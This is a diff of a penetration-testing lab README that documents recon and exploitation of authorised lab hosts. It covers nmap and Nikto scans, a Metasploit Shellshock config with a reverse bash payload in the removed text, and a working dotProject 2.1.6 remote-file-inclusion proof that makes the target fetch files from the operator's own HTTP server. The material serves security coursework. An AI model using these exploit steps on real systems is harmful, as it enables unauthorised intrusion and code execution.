@@ -8,426 +8,99 @@ Session transcripts, command snippets, loot exports, and rough notes. Keep **pas
 
 **Scope:** Lab-authorized targets only — `10.20.160.102`, `10.20.160.101`, `10.20.160.100`.  
 **Operator VM:** **KALI6** (see [parent README](../README.md)).  
-**Placeholders:** Replace `<KALI_IP>` with your Kali interface IP (e.g. from `ip -br a` or `ip addr`), `<RHOST>` with the target below.
+**Placeholders:** Replace `<KALI_IP>` / `<KALI_LAB_IP>` with your Kali address on the **lab network** (e.g. `ip -br a`), `<RHOST>` with the target below.
 
 Summaries below match the Nessus notes in [../README.md](../README.md#nessus--my-hosts-specs--findings); adjust ports and paths after your own `nmap` / service scan.
 
 ---
 
-## `10.20.160.102` — Linux (Kernel 2.6)
-
-### Specs & exposure (recap)
+## `10.20.160.102` — Linux / dotProject 2.1.6 (validated)
 
 | Field | Value |
 |-------|--------|
-| **OS** | Linux Kernel 2.6 |
-| **Nessus highlights** | **Shellshock** (CGI, critical), legacy **SSLv2/v3**, **TLS 1.0**, **DROWN**, **TRACE/TRACK**, **printenv** CGI disclosure, **Logjam**, HTTP/PHP surface |
+| **Role** | Primary **web** target — **Apache 2.2.21**, **PHP 5.3.8**, **LAMPP** path **`/opt/lampp/htdocs/`** (from PHP notice) |
+| **App** | **dotProject 2.1.6** — **`/dotproject/`** (root **302/301** to this path) |
+| **Confirmed primitive** | **RFI** — **`/dotproject/modules/projectdesigner/gantt.php`** + **`dPconfig[root_dir]=http://<KALI>:8080/<file>?`** — response body reflected **`RFI_MARKER_EPT`** / **`PROOF`** ([`102-004` evidence](../Screenshots/102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png)) |
 
-### Vulnerabilities (brief)
+**Lanes that did not pan out:** Shellshock (**MSF `check`** negative), **`msf > search dot`**, **`php_imap_open_rce`**, generic **PHP-CGI** rows, RFI **listener / path** mistakes — full notes and screenshots: **[`unfruitful_attempts/README.md`](unfruitful_attempts/README.md)**.
 
-- **Shellshock** — Bash CGI environment injection; often entry via `/cgi-bin/` scripts.
-- **Weak TLS stack** — old OpenSSL behavior; may support bad ciphers; useful for MiTM in class demos, less often direct shell.
-- **HTTP methods / CGI** — TRACE/TRACK and printenv-style scripts can leak config or assist chaining with Shellshock.
-
-### Plan of attack (commands)
-
-**1 — Map services (adjust ports after discovery).**
+### Plan of attack — commands (current)
 
 ```bash
-# Identity stamp (course habit)
-echo "$USER"; date
-export RHOST=10.20.160.102
-
-nmap -Pn -sS -sV -sC -T4 "$RHOST" -oA ~/scans/nmap_102_initial
-nmap -Pn -sV --top-ports 1000 "$RHOST"
-# If web suspected:
-nmap -Pn -p 80,443,8080,8443 -sV --script http-enum,http-headers "$RHOST"
+export RHOST_102=10.20.160.102
+echo TM6_afrocha; date
+ip -br a    # set LHOST / KALI_LAB_IP to the interface .102 can reach (e.g. 10.20.150.106)
 ```
 
-**2 — Shellshock validation (non-destructive first).**
+**1 — Map services**
 
 ```bash
-# If HTTP(S) on 80/443/8080 — list scripts
-curl -sik "http://$RHOST/" 
-curl -sik "http://$RHOST/cgi-bin/" 
-
-# Nmap Shellshock script against known web ports
-nmap -Pn -p 80,443,8080 --script http-shellshock --script-args http-shellshock.uri=/cgi-bin/test.cgi "$RHOST"
+nmap -Pn -sS -sV -T4 "$RHOST_102" -oA ~/scans/nmap_102_initial
+nmap -Pn -p 80,443,8080,8443 -sV --script http-enum,http-headers "$RHOST_102"
 ```
 
-**3 — Exploitation path (Metasploit example — module names may vary by version).**
+**2 — Web entry + version fingerprint**
 
 ```bash
-msfconsole -q
+curl -sik "http://$RHOST_102/"
+curl -sik "http://$RHOST_102/dotproject/"
+curl -sik "http://$RHOST_102/dotproject/index.php"
 ```
 
-```text
-workspace -a final_systems
-use exploit/multi/http/apache_mod_cgi_bash_env_exec
-set RHOSTS 10.20.160.102
-set RPORT 80
-set TARGETURI /cgi-bin/<script_from_enum>
-set LHOST <KALI_IP>
-set LPORT 4444
-set PAYLOAD cmd/unix/reverse_bash
-run
-```
-
-**4 — Post-ex (local proof / flags).**
+**3 — Optional scanner**
 
 ```bash
-# In obtained shell — adapt paths for course flags
+nikto -h "http://$RHOST_102"
+```
+
+**4 — Exploit-DB + RFI proof (lab-authorized)**
+
+```bash
+searchsploit dotproject 2.1.6
+searchsploit -x php/webapps/<id-for-gantt-RFI>
+
+export LHOST=<KALI_LAB_IP>
+mkdir -p ~/rfi_poc
+printf 'RFI_MARKER_EPT\n' > ~/rfi_poc/marker.txt
+printf 'PROOF\n' > ~/rfi_poc/proof.txt
+cd ~/rfi_poc && python3 -m http.server 8080 --bind 0.0.0.0
+```
+
+New terminal:
+
+```bash
+export RHOST_102=10.20.160.102
+export LHOST=<KALI_LAB_IP>
+
+curl -sI "http://$RHOST_102/dotproject/modules/projectdesigner/gantt.php"
+curl -s "http://$LHOST:8080/proof.txt"
+curl -sik "http://${RHOST_102}/dotproject/modules/projectdesigner/gantt.php?dPconfig%5Broot_dir%5D=http://${LHOST}:8080/proof.txt?"
+```
+
+Use **`http://`** to your listener (**not** `https://`). Keep all served files under **`~/rfi_poc/`** (same directory as **`http.server`**).
+
+**5 — Post-ex (after shell or per rubric)**
+
+```bash
 hostname; whoami; id
 find / -name "local.txt" 2>/dev/null
 find / -name "proof.txt" 2>/dev/null
 ```
 
-### Recon snapshot — `10.20.160.102` (validated)
+### Evidence index (`../Screenshots/`)
 
-![nmap initial: 10.20.160.102 — Apache 2.2.21, PHP 5.3.8, 80/443 open](../Screenshots/recon_nmap_102_initial_tm6_afrocha.png)
-
-| Observation | Detail |
-|-------------|--------|
-| **Command** | `nmap -Pn -sS -sV -T4 "$RHOST_102" -oA ~/scans/nmap_102_initial` (your run) |
-| **Identity stamp** | `echo TM6_afrocha; date` — good habit; keep on evidence for the report |
-| **22/tcp** | **Closed** — skip SSH brute force for this target for now |
-| **80/tcp** | **Open** — **Apache httpd 2.2.21** (Unix), **PHP/5.3.8**, **WebDAV (DAV/2)**, **mod_ssl** + **OpenSSL 1.0.0c**, mod_perl / Perl 5.10.1 |
-| **443/tcp** | **Open** — treat as HTTPS; run TLS/http scripts after 80 |
-| **997 filtered** | Narrow external surface — focus on **web** paths |
-
-**Can we move forward with the plan of attack, or adjust?**
-
-**Move forward — same overall plan (web / CGI / Shellshock lane).** The live scan **confirms** a classic **outdated LAMP-style stack** on **80/443**, which matches the Nessus story (Shellshock, CGI, weak TLS). **Adjustments to prioritize next:**
-
-1. **Double down on HTTP enumeration** — discover real script paths before Metasploit `TARGETURI`: `curl -sik http://10.20.160.102/`, directory brute force on `/cgi-bin/` and common dirs, then `nmap -p80,443 --script http-enum,http-shellshock` with **discovered** URIs (not only `/cgi-bin/test.cgi`).
-2. **Add version-led exploit search** — `searchsploit apache 2.2.21`, `searchsploit php 5.3.8`, and Metasploit `search type:exploit apache` / `php` (lab-authorized only).
-3. **WebDAV** — if PROPFIND/PUT behavior is weak, note it as a separate finding path (upload / traversal) per rubric.
-4. **Do not** sink time into **SSH** on this host until web lanes are exhausted (port 22 closed).
-
-`.101` and `.100` sections are **unchanged** until you have equivalent nmap evidence for those.
-
-### Recon — `http-enum` + `http-headers` on **80 / 443** (validated)
-
-![nmap: http-enum + http-headers on 10.20.160.102 — phpMyAdmin, icons, dotProject cookie](../Screenshots/recon_nmap_102_http_enum_headers_tm6_afrocha.png)
-
-| Observation | Detail |
-|---------------|--------|
-| **Command** | `nmap -Pn -p 80,443,8080,8443 -sV --script http-enum,http-headers "$RHOST_102"` (~38 s) |
-| **80/tcp** | **open** — same Apache **2.2.21** / **PHP 5.3.8** / DAV stack as initial scan |
-| **443/tcp** | **open** — HTTPS (continue script/tls passes here; `https-redirect` script errored in this run—retry with `-d` or manual `curl -k` if needed) |
-| **8080 / 8443** | **filtered** — deprioritize until something else opens them |
-
-**`http-enum` highlights**
-
-| Path | Note |
-|------|------|
-| `/phpmyadmin/` | **401 Authorization Required** — creds or bypass research (lab rules) |
-| `/icons/` | **Directory listing** enabled — version banner leakage; low-hanging info disclosure |
-| `/webalizer/` | **401** — auth gate |
-
-**`http-headers` highlights**
-
-- **`Set-Cookie`**: `dotproject=…` with `path=/dotproject/` → treat **`/dotproject/`** as a primary app target (**dotProject** PHP app — search CVEs / `searchsploit dotproject` for matching major version after you read the page source/login).
-- **`X-Powered-By: PHP/5.3.8`** — confirms PHP surface for app bugs + any misconfigured upload paths.
-
-**Plan tweak after this scan**
-
-1. **Manual browse** — `curl -sik http://10.20.160.102/` , `curl -sik http://10.20.160.102/dotproject/`, `curl -sik http://10.20.160.102/phpmyadmin/` (expect 401 on phpMyAdmin).
-2. **App-led exploits** — dotProject + phpMyAdmin + Apache/PHP version strings drive `searchsploit` / MSF **in parallel** with CGI/Shellshock (you may get a shell faster via a known webapp CVE than generic CGI).
-3. **Shellshock** — still run `http-shellshock` against **discovered** CGI paths (not only `/cgi-bin/test.cgi`); enum may add paths on next passes.
-
-### Recon — `curl` to site root (`HTTP 302` → dotProject)
-
-![curl -sik http://RHOST_102/ — 302 Location, Server banner, X-Powered-By PHP](../Screenshots/recon_curl_root_302_dotproject_tm6_afrocha.png)
-
-| Field | Value |
+| Topic | Files |
 |-------|--------|
-| **Command** | `curl -sik "http://$RHOST_102/"` |
-| **Status** | **HTTP/1.1 302 Found** |
-| **Location** | `http://10.20.160.102/dotproject/` — **root URL redirects here**; treat **`/dotproject/`** as the real entry point (not bare `/`) |
-| **Server** | `Apache/2.2.21 (Unix) DAV/2` … `OpenSSL/1.0.0c` **`PHP/5.3.8`** … `mod_perl` … (same stack as prior scans) |
-| **X-Powered-By** | `PHP/5.3.8` |
-
-**Takeaway:** Enumerate and exploit **dotProject** first (version from HTML/login, `searchsploit dotproject`, default/weak creds per lab policy). Generic CGI/Shellshock remains parallel if you find executable scripts under `/cgi-bin/` or app-upload paths.
-
-### Recon — `curl` to `/dotproject` (`HTTP 301` → trailing slash)
-
-![curl -sik http://RHOST_102/dotproject — 301, Location /dotproject/, Server banner](../Screenshots/recon_curl_dotproject_301_tm6_afrocha.png)
-
-![HTTPS dotproject probes + identity stamp](../Screenshots/recon_curl_dotproject_https_attempts_tm6_afrocha.png)
-
-| Field | Value |
-|-------|--------|
-| **Commands** | `curl -sik "http://$RHOST_102/dotproject"` piped to `head -n 80`; follow-up `https://` attempts and `echo TM6_afrocha; date` |
-| **HTTP status** | **301 Moved Permanently** — **`/dotproject`** (no trailing slash) **canonicalizes** to **`http://10.20.160.102/dotproject/`** via **`Location:`** |
-| **Server** | Same banner as other probes: **Apache/2.2.21**, **PHP/5.3.8**, DAV, **OpenSSL 1.0.0c**, mod_perl, etc. |
-| **HTTPS** | For **443**, use explicit URL and verbose TLS if needed: `curl -vk "https://$RHOST_102/dotproject/"` (or path you are testing); **`-k`** only if the cert chain fails and the lab allows ignoring verification |
-
-**Takeaway:** Treat **`/dotproject/`** (with slash) as the stable path; the **301** is normal directory canonicalization, not a separate app.
-
-#### dotProject — ordered path forward (when exploits feel “stuck”)
-
-1. **Fingerprint the app version** — without this, `searchsploit dotproject` is only a menu. Save evidence with your stamp:
-   - `curl -s "http://$RHOST_102/dotproject/" | head -n 200` (login/footer/version text)
-   - `curl -sik "http://$RHOST_102/dotproject/index.php"` and grep for `dotProject`, `dPversion`, `version`
-   - Quick probes (often 404, cheap to try): `/dotproject/README`, `/dotproject/docs/`, `/dotproject/install/`, `/dotproject/includes/version.php` (names vary by release)
-2. **Match version to Exploit-DB** — `searchsploit -x php/webapps/…` only for rows whose **affected versions include yours**; note required auth (guest vs logged-in).
-3. **Prove the vulnerable path exists** — before running exploit code: `curl -sI "http://$RHOST_102/dotproject/<path-from-advisory>"` (expect **200** or the status the advisory assumes).
-4. **Access** — if the vuln needs a session: default/weak creds **only if the lab rubric allows**, else SQLi/auth-bypass rows that fit your version.
-5. **Parallel (same host)** — **`/phpmyadmin/`** (401): worth a careful read of enum + course policy; **WebDAV** / **`/icons/`** listing already noted; keep **`gobuster` on `/dotproject/`** for backup files (`*.bak`, `config.php`, etc.).
-
-### Recon — `dotproject/index.php` (fingerprint — **Version 2.1.6**)
-
-![curl dotproject/index.php — 200, meta Version, PHP notice path disclosure](../Screenshots/recon_curl_dotproject_index_php_200_meta_tm6_afrocha.png)
-
-![login page HTML — Version 2.1.6, form posts to index.php](../Screenshots/recon_dotproject_login_html_2_1_6_tm6_afrocha.png)
-
-| Field | Value |
-|-------|--------|
-| **Command** | `curl -sik "http://$RHOST_102/dotproject/index.php"` (body trimmed with `head` as needed) |
-| **HTTP** | **200 OK** — login surface; **`Set-Cookie`** `dotproject=…` with **`path=/dotproject/`** |
-| **Version** | **`<meta name="Version" content="2.1.6" />`** and footer text **Version 2.1.6** — use this to filter **`searchsploit`** / CVEs (ignore unrelated major versions). |
-| **Path disclosure** | PHP **Notice** references **`/opt/lampp/htdocs/dotproject/install/do_install_db.php`** — docroot under **XAMPP/LAMPP** (`/opt/lampp/htdocs/`); useful for report narrative and any **LFI/RFI** path logic. |
-| **Login** | **`POST`** to **`index.php`** with **`username`**, **`password`**, hidden **`login`**, **`lostpass`**, **`redirect`** — password recovery toggles via **`lostpass`**. |
-
-**Exploit search (narrowed):** `searchsploit dotproject 2.1.6` then **`searchsploit -x`** on hits that list **2.1.6** (e.g. **baseDir RFI** class for that line). Re-check **`/dotproject/install/`** behavior only in a way your lab allows (some installs leave risky endpoints).
-
-### Exploit lead — dotProject **≤ 2.1.6** RFI (`gantt.php` + `dPconfig[root_dir]`)
-
-**Chronological screenshots (`.102`):** new evidence uses **`102-NNN_…_tm6_afrocha.png`** (`NNN` increments per capture — **`102-001`** is the first in this sequence).
-
-![searchsploit -x — dotProject 2.1.6 RFI, gantt.php, dPconfig root_dir](../Screenshots/searchsploit_dotproject_2_1_6_rfi_gantt_dPconfig_tm6_afrocha.png)
-
-| Field | Value |
-|-------|--------|
-| **Issue** | **Remote file inclusion** via **`$dPconfig['root_dir']`** used in **`include (...)`** in **`modules/projectdesigner/gantt.php`** (advisory snippet: line with **`jpgraph.php`** include). |
-| **Target URI (this vuln)** | **`/dotproject/modules/projectdesigner/gantt.php`** — **not** Metasploit `TARGETURI` generically; this is the **HTTP path** for the RFI query below. |
-| **PoC shape** | `http://<target>/dotproject/modules/projectdesigner/gantt.php?dPconfig[root_dir]=http://<your-host>/marker.txt?` |
-| **PHP prerequisites** | **`register_globals = On`** and **`allow_url_include = On`**. If either is **Off**, the include will not work as written. |
-| **Why it fits `.102`** | Fingerprinted **dotProject 2.1.6** — in the affected range. |
-
-![102-001 — curl -sI gantt.php → HTTP 200, script exists](../Screenshots/102-001_curl_gantt_si_200_tm6_afrocha.png)
-
-| Field | Value |
-|-------|--------|
-| **Command** | `curl -sI "http://$RHOST_102/dotproject/modules/projectdesigner/gantt.php"` |
-| **Result** | **HTTP/1.1 200 OK** — endpoint is reachable; **`Server:`** still **Apache 2.2.21** / **PHP 5.3.8**. |
-| **Stamp** | `echo TM6_afrocha; date` |
-
-**1 — Recon (headers only)**
-
-```bash
-export RHOST_102=10.20.160.102
-curl -sI "http://$RHOST_102/dotproject/modules/projectdesigner/gantt.php"
-echo TM6_afrocha; date
-```
-
-**2 — RFI proof (lab-authorized only):** **`LHOST`** = Kali IP **reachable from `.102`** (lab/VPN interface).
-
-```bash
-export RHOST_102=10.20.160.102
-export LHOST=<KALI_IP>
-
-# Terminal A — serve a one-line marker (no PHP execution required for a first pass)
-mkdir -p ~/rfi_poc && printf 'RFI_MARKER_EPT\n' > ~/rfi_poc/marker.txt
-cd ~/rfi_poc && python3 -m http.server 8080 --bind 0.0.0.0
-
-# Terminal B — request includes remote file via dPconfig[root_dir] (trailing ? matches classic PoCs)
-curl -sik "http://${RHOST_102}/dotproject/modules/projectdesigner/gantt.php?dPconfig%5Broot_dir%5D=http://${LHOST}:8080/marker.txt?"
-
-# Optional second proof file — MUST live in the same directory the http.server was started from (~/rfi_poc), not ~/loot
-printf 'PROOF\n' > ~/rfi_poc/proof.txt
-curl -s "http://${LHOST}:8080/proof.txt"
-curl -sik "http://${RHOST_102}/dotproject/modules/projectdesigner/gantt.php?dPconfig%5Broot_dir%5D=http://${LHOST}:8080/proof.txt?"
-```
-
-**Success signal:** response body contains **`RFI_MARKER_EPT`** or **`PROOF`** (or obvious PHP **fatal** mentioning **`allow_url_include`**, **`Failed opening**`, **`http:// wrapper`**, which tells you the **`php.ini`** posture).
-
-#### Validation — RFI attempt **`102-003`** (`Connection refused`)
-
-![102-003 — gantt.php include() pulls http://Kali/marker.txt; stream: Connection refused](../Screenshots/102-003_rfi_gantt_include_connection_refused_tm6_afrocha.png)
-
-| What you see | What it means |
-|----------------|---------------|
-| **Warnings on `include()`** for a URL like **`http://<LHOST>:8080/marker.txt?/lib/jpgraph/...`** | **`dPconfig[root_dir]` is being applied** — the app builds **`include($root_dir.'/lib/jpgraph/...')`**, so your poisoned **`root_dir`** is **actually used**. That is strong evidence the **RFI primitive is live** (and **`allow_url_include`** is at least allowing the **attempt** to open an **`http://`** stream). |
-| **`failed to open stream: Connection refused`** | The **victim (`.102`)** tried to **connect outbound** to **`LHOST:8080`** and **nothing accepted** the TCP connection. This is usually **not** “RFI patched off” — it is **network / listener**: wrong **`LHOST`** for the lab route, **`python3 -m http.server`** not running, server bound to **127.0.0.1** only, **Kali firewall**, or **lab ACL** blocking **`.102` → your Kali IP**. |
-| **`Call to undefined function defVal()`** | The **jpgraph** include chain **did not complete** (dependencies missing after the failed remote step), so the script dies later — **expected** until the include path works. |
-
-**Fix the callback, then retry:** on Kali use the **VPN / lab interface IP** (`ip -br a`), **`python3 -m http.server 8080 --bind 0.0.0.0`**, confirm **`ss -tlnp | grep 8080`** shows a listener, and from another host on the same segment **`curl http://<LHOST>:8080/marker.txt`** if possible. Re-run the same **`curl`** to **`gantt.php`**.
-
-#### Validation — RFI confirmed **`102-004`** (`proof.txt` → **`PROOF`** in response body)
-
-![102-004 — local proof.txt OK; gantt.php reflects PROOF + stamp](../Screenshots/102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png)
-
-| Field | Value |
-|-------|--------|
-| **Local check** | `curl -s "http://10.20.150.106:8080/proof.txt"` → **`PROOF`** (file served from **`~/rfi_poc/proof.txt`** — same cwd as **`http.server`**) |
-| **Exploit** | `curl -sik "http://10.20.160.102/dotproject/modules/projectdesigner/gantt.php?dPconfig%5Broot_dir%5D=http://10.20.150.106:8080/proof.txt?"` |
-| **Result** | **HTTP 200** — response body shows **`PROOF`** (twice, from include chain); then **`defVal()`** fatal as before — **RFI demonstrated** for the report |
-| **Stamp** | `echo TM6_afrocha; date` |
-
-**3 — If remote include works and course allows code execution:** host a **`<?php … ?>`** file on **`LHOST`** and repeat (only if **`allow_url_include`** allows execution — many configs do **not**); otherwise pivot to **LFI**/local tricks per **`searchsploit -x`**.
-
-### Recon — `curl /cgi-bin` (404; headers + error body)
-
-![curl -sik http://RHOST_102/cgi-bin — 404, Server banner](../Screenshots/recon_curl_cgi-bin_404_headers_tm6_afrocha.png)
-
-![404 body + echo TM6_afrocha; date](../Screenshots/recon_curl_cgi-bin_404_body_stamp_tm6_afrocha.png)
-
-| Field | Value |
-|-------|--------|
-| **Commands** | `curl -sik "http://$RHOST_102/cgi-bin"` (and follow-up showing HTML 404 + stamp) |
-| **HTTP status** | **404 Not Found** for this URL — **`/cgi-bin` is not a document** (no trailing slash / no default index) |
-| **Still useful** | **Server** header repeats Apache **2.2.21**, **PHP 5.3.8**, DAV, OpenSSL **1.0.0c**, etc. — same intel as other probes |
-| **404 body** | Standard Apache “Object not found!” — confirms **10.20.160.102** in `<address>` line on error pages |
-
-### Recon — Nikto **`http://10.20.160.102:80`** (validated)
-
-![Nikto — banner, redirect to /dotproject/, Shellshock printenv, EOL stack](../Screenshots/recon_nikto_102_http80_banner_redirect_tm6_afrocha.png)
-
-![Nikto — dotProject “interesting” paths, Shellshock test-cgi, scan stats + stamp](../Screenshots/recon_nikto_102_dotproject_paths_shellshock_tm6_afrocha.png)
-
-| Field | Value |
-|-------|--------|
-| **Command** | `nikto -h "http://$RHOST_102"` (port **80**; optional **`-o ~/scans/nikto_102.htm -Format htm`**) |
-| **Redirect** | Confirms **`/` → `http://10.20.160.102/dotproject/`** |
-| **Shellshock (CVE-2014-6271 / 6278)** | Nikto reports **`/cgi-bin/printenv`** and **`/cgi-bin/test-cgi`** as **appearing vulnerable** — **not** the same as a bare **`/cgi-bin`** URL (404). Validate before Metasploit. |
-| **Other flags** | **TRACE** (XST class), PHP “sensitive query string” pattern (OSVDB-12184-style), **ETag** inode leak on **`/favicon.ico`**, **`/icons/`** indexing, **mod_negotiation** + MultiViews, missing **`X-Frame-Options`** / **`X-XSS-Protection`** / **`X-Content-Type-Options`**. |
-| **mod_ssl / CVE-2002-0082** | Nikto may surface **old advisory** text — **verify applicability** (banner heuristics can be noisy). |
-
-**dotProject paths Nikto highlighted** (check with **`curl -sI`** / session as needed):
-
-- `/dotproject/modules/files/index_table.php`
-- `/dotproject/modules/projects/addedit.php`
-- `/dotproject/modules/projects/view.php`
-- `/dotproject/modules/projects/vw_files.php`
-- `/dotproject/modules/tasks/addedit.php`
-- `/dotproject/modules/tasks/viewgantt.php`
-
-#### Do we have what we need for **Metasploit `TARGETURI`** (Shellshock / `apache_mod_cgi_bash_env_exec`)?
-
-| Need | Status |
-|------|--------|
-| **A specific CGI script path** | **Candidates from Nikto:** **`/cgi-bin/printenv`** and **`/cgi-bin/test-cgi`**. Set **`TARGETURI`** to one **full path** (not `/cgi-bin` alone). Confirm behavior first. |
-| **Earlier `curl` on `/cgi-bin`** | **404** without a **script name** — does **not** rule out **`printenv`** / **`test-cgi`**. |
-| **Proof the stack is old / CGI-capable** | **Yes** — banners + Nikto **named** CGI endpoints. |
-
-**Next commands (examples):**
-
-```bash
-curl -sik "http://$RHOST_102/cgi-bin/"
-curl -sik "http://$RHOST_102/cgi-bin/printenv"
-curl -sik "http://$RHOST_102/cgi-bin/test-cgi"
-nmap -Pn -p80 --script http-shellshock --script-args http-shellshock.uri=/cgi-bin/printenv "$RHOST_102"
-nmap -Pn -p80 --script http-shellshock --script-args http-shellshock.uri=/cgi-bin/test-cgi "$RHOST_102"
-gobuster dir -u "http://$RHOST_102/cgi-bin/" -w /usr/share/wordlists/dirb/common.txt -x cgi,pl,sh
-```
-
-**Metasploit (after validation):** `set TARGETURI /cgi-bin/printenv` **or** `/cgi-bin/test-cgi` — **one path per attempt**.
-
-Keep **`/dotproject/`** (**2.1.6**) as the **parallel** app lane; cross-check Nikto paths with **`searchsploit dotproject 2.1.6`** (**`vw_files.php`** overlaps some historic RFI write-ups — still **`searchsploit -x`** first).
-
-### Exploitation attempt — Metasploit **`exploit/multi/http/apache_mod_cgi_bash_env_exec`** (`printenv`)
-
-![MSF Shellshock module — check reports not exploitable at /cgi-bin/printenv](../Screenshots/exploit_msf_shellshock_printenv_check_not_vuln_tm6_afrocha.png)
-
-| Field | Value |
-|-------|--------|
-| **Module** | `exploit/multi/http/apache_mod_cgi_bash_env_exec` |
-| **Settings (typical)** | `set RHOSTS 10.20.160.102` · `set RPORT 80` · **`set TARGETURI /cgi-bin/printenv`** · payload e.g. **`linux/x86/meterpreter/reverse_tcp`** + `LHOST` / `LPORT` |
-| **Result** | **`check`** → **The target is not exploitable** at this URI (screenshot evidence). |
-
-**`RPATH` ≠ CGI path** — In this module, **`RPATH`** means **target filesystem prefix for CmdStager** (default **`/bin`**, used so commands invoke **`/bin/chmod`**, etc.). The **web path to the CGI script** is only **`TARGETURI`**. Do **not** set **`RPATH`** to **`/cgi-bin/printenv`**.
-
-**If `check` fails but Nikto “flagged” Shellshock:** Treat Nikto as a **hint**, not proof — **patched bash**, **header not passed** into bash via that CGI, or **script behavior** can block the module’s marker test. **Optional retries (lab policy):** **`TARGETURI /cgi-bin/test-cgi`**, **`set CVE CVE-2014-6278`**, alternate **`HEADER`** (**`Referer`**, **`Cookie`**) per module **`show options`**. If still negative, **prioritize dotProject 2.1.6** and other findings over Shellshock.
-
-### Recon — `nmap --script http-shellshock` (default test URI)
-
-![nmap http-shellshock uri=/cgi-bin/test.cgi — 80/443 open, 8080 filtered, no script finding line](../Screenshots/recon_nmap_http_shellshock_test_cgi_tm6_afrocha.png)
-
-| Field | Value |
-|-------|--------|
-| **Command** | `nmap -Pn -p 80,443,8080 --script http-shellshock --script-args http-shellshock.uri=/cgi-bin/test.cgi "$RHOST_102"` |
-| **Ports** | **80** open (http), **443** open (https), **8080** **filtered** (skip for now) |
-| **Shellshock script output** | **None** — Nmap did **not** print a `|_ http-shellshock:` result line under the ports |
-
-**What that means**
-
-- The **NSE script ran**, but **did not report Shellshock** for **`http-shellshock.uri=/cgi-bin/test.cgi`**.
-- Typical reasons: **`/cgi-bin/test.cgi` does not exist** (matches your earlier **404** on `/cgi-bin`), or the path is **not executed as CGI**, or the host is **not vulnerable** at that URL.
-- So this scan **does not** give you a working **`TARGETURI`** for Metasploit — it **rules out** (or fails to confirm) the **stock example** path only.
-- **Update:** Re-run NSE with Nikto’s URIs — **`http-shellshock.uri=/cgi-bin/printenv`** and **`/cgi-bin/test-cgi`** (see **Nikto** section above).
-
-**What to do next**
-
-1. **Retry `http-shellshock`** with **`/cgi-bin/printenv`** and **`/cgi-bin/test-cgi`** before guessing other names.
-2. **Brute-force additional `.cgi` / `.pl` names** under `/cgi-bin/` only if those fail (see `gobuster`/`ffuf` above).
-3. **Parallel:** **dotProject 2.1.6** app lane remains valid (Nikto module list + **`searchsploit`**).
-
-### COA 2 — `searchsploit` options (Apache / PHP stack on `.102`)
-
-#### `TARGETURI` for PHP / dotProject vs Shellshock (different meanings)
-
-| Topic | What to set | Your `.102` status |
-|--------|-------------|-------------------|
-| **Metasploit `apache_mod_cgi_bash_env_exec` (Shellshock)** | **`TARGETURI`** = **CGI URL path**; **`RPATH`** = **`/bin`**-style **CmdStager prefix**, not `/cgi-bin/…`. | **`check` failed** at **`/cgi-bin/printenv`** — try **`test-cgi`** / **`CVE-2014-6278`** / other **HEADER**, or **drop Shellshock** and drive **dotProject 2.1.6**. |
-| **Metasploit PHP / webapp modules** | Usually **`TARGETURI`** = **web root of the app**, often **`/dotproject/`** (trailing slash per module docs). Some modules add options for a vulnerable script name. | **Yes — use `/dotproject/`** as the **base path** once you pick a module whose prerequisites match your fingerprinted **dotProject** version. |
-| **Exploit-DB / `searchsploit` PHP scripts** | Often a **full URL** or **path under the app** passed on the command line; paths in the DB (e.g. `modules/public/calendar.php`) are **relative to the dotProject folder**. | Full URL pattern: **`http://10.20.160.102/dotproject/<path-from-exploit>`** — confirm the file exists with **`curl -I`** before running anything. |
-| **`exploit/linux/http/php_imap_open_rce`** (CVE-2018-19518 class) | **`TARGETURI`** = **base path for a *named* target** in the module (PrestaShop **admin** directory, SuiteCRM **`/`**, e107, Horde IMP, or **`custom`**). Usually needs **credentials**. It is **not** “any PHP app under `/dotproject/`”. | **No valid stock `TARGETURI` for dotProject** — the module does **not** include a dotProject target. Only use it if you **prove** some page passes input into **`imap_open()`** (then often **`custom`**), which is **unlikely** to be your main path vs **dotProject 2.1.6** CVE-style issues. |
-
-**Summary:** You **do** have a stable **app base** for PHP work: **`/dotproject/`**. You **do not** reuse that string as Shellshock **`TARGETURI`** unless you later find a **CGI** endpoint; for dotProject, the interesting file paths come from **`searchsploit -x …`** and **`curl`** verification, not from the Shellshock module.
-
-### Metasploit — `search dot` (noise; **no dotProject module**)
-
-![102-002 — msf search “dot” matches DotNet/dotnet/etc., not dotProject](../Screenshots/102-002_msf_search_dot_noise_tm6_afrocha.png)
-
-| Observation | Detail |
-|---------------|--------|
-| **What happened** | A **`search`** for **`dot`** (or similar) returns **DotNetNuke**, **dotnet**, **Oracle WebLogic**, **Struts**, etc. — substring matches — **not** the **dotProject** PHP app. |
-| **Expectation** | Metasploit **does not** list a dedicated **`dotproject`** exploit in normal builds; your **`Matching Modules`** table can still look “full” while having **nothing** for this target. |
-| **If you need a specific module by path** | `use exploit/linux/http/php_imap_open_rce` **or** `search imap_open type:exploit` — that module exists, but it **still** does not map to **dotProject** without a supported **target** + **`TARGETURI`**. |
-| **What to use instead** | **`searchsploit dotproject 2.1.6`**, **`searchsploit -x …`**, and the **RFI / SQLi** HTTP PoCs in this README — **not** `search dot`. |
-
-Evidence captures:
-
-| Screenshot | Command |
-|------------|---------|
-| ![searchsploit apache 2.2.21](../Screenshots/searchsploit_apache_2_2_21_tm6_afrocha.png) | `searchsploit apache 2.2.21` |
-| ![searchsploit php 5.3.8](../Screenshots/searchsploit_php_5_3_8_tm6_afrocha.png) | `searchsploit php 5.3.8` |
-| ![searchsploit php extended](../Screenshots/searchsploit_php_5_3_8_extended_tm6_afrocha.png) | (long `php 5.3.8` result list) |
-| ![searchsploit php + stamp](../Screenshots/searchsploit_php_results_stamp_tm6_afrocha.png) | same search + `echo TM6_afrocha; date` |
-| ![searchsploit dotproject](../Screenshots/searchsploit_dotproject_tm6_afrocha.png) | `searchsploit dotproject` + `echo TM6_afrocha; date` |
-
-**Prioritized “options” (read each exploit’s header before running anything):**
-
-| Tier | Exploit-DB path (examples from your output) | Why it might matter |
-|------|----------------------------------------------|---------------------|
-| **A — try first** | `php/remote/29290.c`, `php/remote/29316.py` — **Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 — cgi-bin / RCE** | Matches **PHP 5.3.8** + Apache; often needs **`php-cgi`**-style URL or specific **`cgi-bin`** routing — align with your enum. |
-| **A** | `php/remote/18836.py` — **PHP &lt; 5.3.12 / &lt; 5.4.2 — CGI argument injection** (CVE-2012-1823 class) | Famous **PHP-CGI** misconfiguration; requires vulnerable **`php-cgi`** invocation (not every mod_php site). |
